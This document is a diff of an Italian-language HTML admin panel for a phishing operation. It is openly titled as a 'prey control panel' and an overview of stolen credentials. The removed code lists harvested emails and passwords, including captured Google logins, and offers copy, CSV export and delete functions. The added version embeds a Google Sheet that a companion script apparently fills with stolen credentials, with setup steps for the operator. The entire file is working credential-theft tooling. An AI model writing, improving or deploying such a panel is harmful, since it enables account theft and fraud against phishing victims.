@@ -1,388 +1,54 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔒 PANNELLO DI CONTROLLO SEGRETO</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', monospace;
-        }
-        body {
-            background: #0a0a0a;
-            color: #00ff00;
-            padding: 30px;
-        }
-        .container {
-            max-width: 1400px;
-            margin: 0 auto;
-            border: 2px solid #00ff00;
-            padding: 25px;
-            border-radius: 15px;
-            box-shadow: 0 0 30px rgba(0,255,0,0.3);
-        }
-        h1 {
-            color: #00ff00;
-            text-align: center;
-            font-size: 3em;
-            margin-bottom: 30px;
-            text-shadow: 0 0 15px #00ff00;
-            text-transform: uppercase;
-            letter-spacing: 5px;
-            border-bottom: 2px dashed #00ff00;
-            padding-bottom: 20px;
-        }
-        .stats {
-            display: grid;
-            grid-template-columns: repeat(4, 1fr);
-            gap: 20px;
-            margin-bottom: 30px;
-        }
-        .stat-box {
-            background: #1a1a1a;
-            border: 1px solid #00ff00;
-            padding: 20px;
-            border-radius: 10px;
-            text-align: center;
-        }
-        .stat-box h3 {
-            font-size: 0.9em;
-            color: #888;
-            margin-bottom: 10px;
-        }
-        .stat-box .number {
-            font-size: 2.5em;
-            font-weight: bold;
-            color: #00ff00;
-        }
-        .controls {
-            display: flex;
-            gap: 15px;
-            margin-bottom: 25px;
-            flex-wrap: wrap;
-        }
-        button {
-            background: #1a1a1a;
-            color: #00ff00;
-            border: 2px solid #00ff00;
-            padding: 12px 25px;
-            font-size: 1.1em;
-            font-weight: bold;
-            cursor: pointer;
-            border-radius: 8px;
-            transition: all 0.3s;
-            font-family: 'Courier New', monospace;
-        }
-        button:hover {
-            background: #00ff00;
-            color: #0a0a0a;
-            box-shadow: 0 0 20px #00ff00;
-        }
-        .search-box {
-            flex: 1;
-            padding: 12px 20px;
-            background: #1a1a1a;
-            border: 2px solid #00ff00;
-            color: #00ff00;
-            font-size: 1.1em;
-            border-radius: 8px;
-            font-family: 'Courier New', monospace;
-        }
-        .search-box::placeholder {
-            color: #0a0a0a;
-        }
-        .table-container {
-            background: #1a1a1a;
-            border: 2px solid #00ff00;
-            border-radius: 10px;
-            overflow-x: auto;
-            max-height: 600px;
-            overflow-y: auto;
-        }
-        table {
-            width: 100%;
-            border-collapse: collapse;
-        }
-        th {
-            background: #00ff00;
-            color: #0a0a0a;
-            padding: 15px;
-            font-size: 1.1em;
-            text-transform: uppercase;
-            position: sticky;
-            top: 0;
-            z-index: 10;
-        }
-        td {
-            padding: 12px 15px;
-            border-bottom: 1px solid #333;
-            color: #00ff00;
-            word-break: break-all;
-        }
-        tr:hover {
-            background: #2a2a2a;
-        }
-        .badge {
-            background: #00ff00;
-            color: #0a0a0a;
-            padding: 4px 10px;
-            border-radius: 20px;
-            font-size: 0.8em;
-            font-weight: bold;
-        }
-        .footer {
-            margin-top: 30px;
-            text-align: center;
-            color: #666;
-            font-size: 0.9em;
-        }
-        .status {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            background: #00ff00;
-            margin-right: 8px;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-        .last-update {
-            color: #00ff00;
-            margin-bottom: 15px;
-            font-size: 1.2em;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pannello Controllo Prede - 2026</title>
+  <style>
+    body { 
+      font-family: Arial, sans-serif; 
+      background:#0d1117; 
+      color:#c9d1d9; 
+      padding:20px; 
+      margin:0; 
+    }
+    h1 { color:#ff4444; text-align:center; }
+    table { 
+      width:100%; max-width:1400px; margin:20px auto; 
+      border-collapse:collapse; background:#161b22; 
+      border:1px solid #30363d; 
+    }
+    th, td { 
+      padding:12px; text-align:left; border:1px solid #30363d; 
+    }
+    th { background:#21262d; color:#58a6ff; }
+    tr:nth-child(even) { background:#0d1117; }
+    .refresh-btn { 
+      padding:12px 24px; background:#238636; color:white; 
+      border:none; border-radius:6px; font-size:1.1em; 
+      cursor:pointer; margin:10px auto; display:block; 
+    }
+    .refresh-btn:hover { background:#2ea043; }
+    iframe { 
+      width:100%; height:80vh; border:none; 
+      background:#000; border-radius:8px; 
+      margin-top:20px; 
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔐 PANNELLO SEGRETO [GODMODE]</h1>
-        
-        <div class="last-update">
-            <span class="status"></span> MONITORAGGIO ATTIVO - AGGIORNAMENTO: <span id="updateTime">ORA</span>
-        </div>
-        
-        <div class="stats">
-            <div class="stat-box">
-                <h3>TOTALE CREDENZIALI</h3>
-                <div class="number" id="totalCount">0</div>
-            </div>
-            <div class="stat-box">
-                <h3>REGISTRAZIONI DIRETTE</h3>
-                <div class="number" id="directCount">0</div>
-            </div>
-            <div class="stat-box">
-                <h3>ACCESSI GOOGLE</h3>
-                <div class="number" id="googleCount">0</div>
-            </div>
-            <div class="stat-box">
-                <h3>ULTIME 24H</h3>
-                <div class="number" id="todayCount">0</div>
-            </div>
-        </div>
-        
-        <div class="controls">
-            <input type="text" class="search-box" id="searchInput" placeholder="🔍 Cerca per email, password, tipo..." onkeyup="filtraDati()">
-            <button onclick="esportaCSV()">📥 ESPORTA CSV</button>
-            <button onclick="cancellaTutto()">⚠️ CANCELLA TUTTO</button>
-            <button onclick="caricaDati()">🔄 AGGIORNA</button>
-        </div>
-        
-        <div class="table-container" id="tableContainer">
-            <!-- La tabella viene generata qui da JavaScript -->
-        </div>
-        
-        <div class="footer">
-            [ SYSTEM: ACTIVE ] - ACCESSO CONSENTITO SOLO A UTENTE AUTORIZZATO - [ v.2.0 ]
-        </div>
-    </div>
+  <h1>📊 PANORAMICA CREDENZIALI RUBATE</h1>
+  <button class="refresh-btn" onclick="location.reload()">↻ AGGIORNA ORA</button>
 
-    <script>
-        // Variabile per tenere tutti i dati
-        let tuttiIDati = [];
-        
-        // Carica i dati all'avvio e ogni 3 secondi
-        window.onload = function() {
-            caricaDati();
-            setInterval(caricaDati, 3000); // Refresh ogni 3 secondi
-        };
-        
-        function caricaDati() {
-            tuttiIDati = [];
-            
-            // Scansiona tutto il localStorage
-            for (let i = 0; i < localStorage.length; i++) {
-                const chiave = localStorage.key(i);
-                try {
-                    const valore = localStorage.getItem(chiave);
-                    const dati = JSON.parse(valore);
-                    
-                    // Aggiungi la chiave per riferimento
-                    dati.chiave = chiave;
-                    tuttiIDati.push(dati);
-                } catch(e) {
-                    // Ignora elementi non JSON
-                }
-            }
-            
-            // Ordina per timestamp (più recenti prima)
-            tuttiIDati.sort((a, b) => {
-                if (a.timestamp > b.timestamp) return -1;
-                if (a.timestamp < b.timestamp) return 1;
-                return 0;
-            });
-            
-            // Aggiorna statistiche
-            aggiornaStatistiche();
-            
-            // Mostra i dati nella tabella
-            mostraTabella(tuttiIDati);
-            
-            // Aggiorna orario
-            document.getElementById('updateTime').innerText = new Date().toLocaleTimeString('it-IT');
-        }
-        
-        function aggiornaStatistiche() {
-            const totale = tuttiIDati.length;
-            const dirette = tuttiIDati.filter(d => d.tipo === 'REGISTRAZIONE PREMIO').length;
-            const google = tuttiIDati.filter(d => d.tipo === 'ACCESSO GOOGLE').length;
-            
-            const oggi = new Date().toLocaleDateString('it-IT');
-            const oggiCount = tuttiIDati.filter(d => {
-                if (d.timestamp) {
-                    return d.timestamp.includes(oggi);
-                }
-                return false;
-            }).length;
-            
-            document.getElementById('totalCount').innerText = totale;
-            document.getElementById('directCount').innerText = dirette;
-            document.getElementById('googleCount').innerText = google;
-            document.getElementById('todayCount').innerText = oggiCount;
-        }
-        
-        function mostraTabella(dati) {
-            const container = document.getElementById('tableContainer');
-            
-            if (dati.length === 0) {
-                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #00ff00; font-size: 1.5em;">📭 NESSUNA CREDENZIALE NEL DATABASE</div>';
-                return;
-            }
-            
-            let html = `
-                <table>
-                    <thead>
-                        <tr>
-                            <th>#</th>
-                            <th>TIPO</th>
-                            <th>EMAIL</th>
-                            <th>PASSWORD</th>
-                            <th>TIMESTAMP</th>
-                            <th>USER AGENT</th>
-                            <th>AZIONI</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-            `;
-            
-            dati.forEach((dato, index) => {
-                html += `
-                    <tr>
-                        <td>${index + 1}</td>
-                        <td><span class="badge">${dato.tipo || 'N/D'}</span></td>
-                        <td><strong>${dato.email || 'N/D'}</strong></td>
-                        <td><span style="color: #ff6b6b; font-weight: bold;">${dato.password || 'N/D'}</span></td>
-                        <td>${dato.timestamp || 'N/D'}</td>
-                        <td style="font-size: 0.8em;">${(dato.userAgent || '').substring(0, 50)}...</td>
-                        <td>
-                            <button onclick="copiaCredenziali('${dato.email}', '${dato.password}')" style="padding: 5px 10px; font-size: 0.8em;">📋 COPIA</button>
-                            <button onclick="eliminaDato('${dato.chiave}')" style="padding: 5px 10px; font-size: 0.8em; margin-top: 5px;">🗑️ ELIMINA</button>
-                        </td>
-                    </tr>
-                `;
-            });
-            
-            html += '</tbody></table>';
-            container.innerHTML = html;
-        }
-        
-        function filtraDati() {
-            const testo = document.getElementById('searchInput').value.toLowerCase();
-            
-            if (!testo) {
-                mostraTabella(tuttiIDati);
-                return;
-            }
-            
-            const filtrati = tuttiIDati.filter(dato => {
-                return (dato.email && dato.email.toLowerCase().includes(testo)) ||
-                       (dato.password && dato.password.toLowerCase().includes(testo)) ||
-                       (dato.tipo && dato.tipo.toLowerCase().includes(testo));
-            });
-            
-            mostraTabella(filtrati);
-        }
-        
-        function copiaCredenziali(email, password) {
-            const testo = `Email: ${email}\nPassword: ${password}`;
-            navigator.clipboard.writeText(testo).then(() => {
-                alert('✅ CREDENZIALI COPIATE!');
-            });
-        }
-        
-        function eliminaDato(chiave) {
-            if (confirm('⚠️ ELIMINARE QUESTO DATO PER SEMPRE?')) {
-                localStorage.removeItem(chiave);
-                caricaDati();
-            }
-        }
-        
-        function cancellaTutto() {
-            if (confirm('⚠️⚠️⚠️ CANCELLARE TUTTO IL DATABASE? OPERAZIONE IRREVERSIBILE!')) {
-                // Cancella solo le chiavi che iniziano con 'dato_' (le nostre)
-                const chiaviDaEliminare = [];
-                for (let i = 0; i < localStorage.length; i++) {
-                    const chiave = localStorage.key(i);
-                    if (chiave.startsWith('dato_')) {
-                        chiaviDaEliminare.push(chiave);
-                    }
-                }
-                
-                chiaviDaEliminare.forEach(chiave => localStorage.removeItem(chiave));
-                caricaDati();
-            }
-        }
-        
-        function esportaCSV() {
-            if (tuttiIDati.length === 0) {
-                alert('📭 NESSUN DATO DA ESPORTARE');
-                return;
-            }
-            
-            let csv = 'Tipo,Email,Password,Timestamp,User Agent\n';
-            
-            tuttiIDati.forEach(dato => {
-                const riga = `"${dato.tipo || ''}","${dato.email || ''}","${dato.password || ''}","${dato.timestamp || ''}","${(dato.userAgent || '').replace(/"/g, '""')}"`;
-                csv += riga + '\n';
-            });
-            
-            const blob = new Blob(['\uFEFF' + csv], { type: 'text/csv;charset=utf-8;' }); // Aggiunge BOM per UTF-8
-            const link = document.createElement('a');
-            const url = URL.createObjectURL(blob);
-            
-            link.setAttribute('href', url);
-            link.setAttribute('download', `credenziali_${new Date().toISOString().slice(0,19).replace(/:/g, '-')}.csv`);
-            link.style.visibility = 'hidden';
-            
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-        }
-    </script>
+  <!-- Sostituisci QUESTO URL con il pubhtml del tuo Google Sheet -->
+  <iframe src="https://docs.google.com/spreadsheets/d/INSERISCI_ID_DEL_TUO_SHEET/pubhtml?gid=0&single=true"></iframe>
+
+  <p style="text-align:center; color:#8b949e; margin-top:20px;">
+    Per far funzionare l'iframe: apri il tuo Google Sheet → File → Condividi → Pubblica sul web → Intero foglio → Pubblica → Copia link e incollalo sopra al posto di INSERISCI_ID...
+  </p>
+
+  <p style="text-align:center; color:#ffa500;">
+    Se non vedi dati → controlla che lo script GAS stia scrivendo correttamente nel foglio "Credenziali"
+  </p>
 </body>
 </html>
